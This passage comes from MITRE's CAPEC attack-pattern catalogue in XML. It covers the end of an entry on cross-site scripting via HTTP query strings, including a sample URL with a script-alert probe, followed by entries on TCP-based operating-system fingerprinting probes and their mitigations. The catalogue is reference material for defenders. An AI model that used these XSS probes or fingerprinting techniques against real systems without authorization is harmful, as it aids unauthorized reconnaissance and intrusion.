               <Description>[Attempt variations on input parameters] Possibly using an automated tool, an attacker requests variations on the URLs he spidered before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.</Description>
               <Technique>Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.</Technique>
               <Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To place malicious payload on server via HTTP</Skill>
            <Skill Level="High">Exploiting any information gathered by HTTP Query on script host</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to send HTTP post to scripting host and collect output</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Design: Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Disable scripting languages such as JavaScript in browser</Mitigation>
            <Mitigation>Implementation: Session tokens for specific host</Mitigation>
            <Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
            <Mitigation>Implementation: Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>http://user:host@example.com:8080/oradb&lt;script&gt;alert('Hi')&lt;/script&gt;</Example>
            <Example>
               <xhtml:p>Web applications that accept name value pairs in a HTTP Query string are inherently at risk to any value (or name for that matter) that an attacker would like to enter in the query string. This can be done manually via web browser or trivially scripted to post the query string to multiple sites. In the latter case, in the instance of many sites using similar infrastructure with predictable http queries being accepted and operated on (such as blogging software, Google applications, and so on), a single malicious payload can be scripted to target a wide variety of sites.</xhtml:p>
               <xhtml:p>Web 2.0 type sites like Technorati and del.icio.us rely on user generated content like tags to build http links that are displayed to other users. del.icio.us allows users to identify sites, tag them with metadata and provide URL, descriptions and more data. This data is then echoed back to any other web browser that is interested in the link. If the data is not validated by the del.icio.us site properly then an arbitrary code can be added into the standard http string sent to del.icio.us by the attacker, for example formatted as normal content with a URL and description and tagged as Java, and available to be clicked on (and executed by) any user browsing for Java content that clicks on this trojaned content.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="80"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Embedding Scripts in HTTP Query Strings</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="320" Name="TCP Timestamp Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine if timestamps are present.] The adversary sends a probe packet to the remote host to identify if timestamps are present.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Record and analyze timestamp values.] If the remote host is using timestamp, obtain several timestamps, analyze them and compare them to known values.</Description>
               <Technique>The adversary sends several requests and records the timestamp values.</Technique>
               <Technique>The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.</Technique>
               <Technique>The adversary compares this result to a database of known TCP timestamp increments for a possible match.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.The target OS must support the TCP timestamp option in order to obtain a fingerprint.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>
               <xhtml:p>Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.</xhtml:p>
               <xhtml:p>A tool capable of sending and receiving packets from a remote system.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description, Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="321" Name="TCP Sequence Number Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows: 1) the Sequence Number generated by the target is Zero, 2) the Sequence Number generated by the target is the same as the acknowledgement number in the probe, 3) the Sequence Number generated by the target is the acknowledgement number plus one, or 4) the Sequence Number is any other non-zero number.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 55-56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="322" Name="TCP (ISN) Greatest Common Divisor Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="323" Name="TCP (ISN) Counter Rate Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>
               <xhtml:p>Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.</xhtml:p>
               <xhtml:p>A tool capable of sending and receiving packets from a remote system.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="324" Name="TCP (ISN) Sequence Predictability Probe" Abstraction="Detailed" Status="Stable">
         <Description>This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
            <Reference External_Reference_ID="REF-130"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="325" Name="TCP Congestion Control Flag (ECN) Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="326" Name="TCP Initial Window Size Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the "connected" state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="327" Name="TCP Options Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="328" Name="TCP 'RST' Flag Checksum Probe" Abstraction="Detailed" Status="Stable">
         <Description>This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="312"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A tool capable of sending and receiving packets from a remote system.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 2: Scanning, pg. 56"/>
            <Reference External_Reference_ID="REF-128"/>
            <Reference External_Reference_ID="REF-212" Section="Chapter 8. Remote OS Detection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
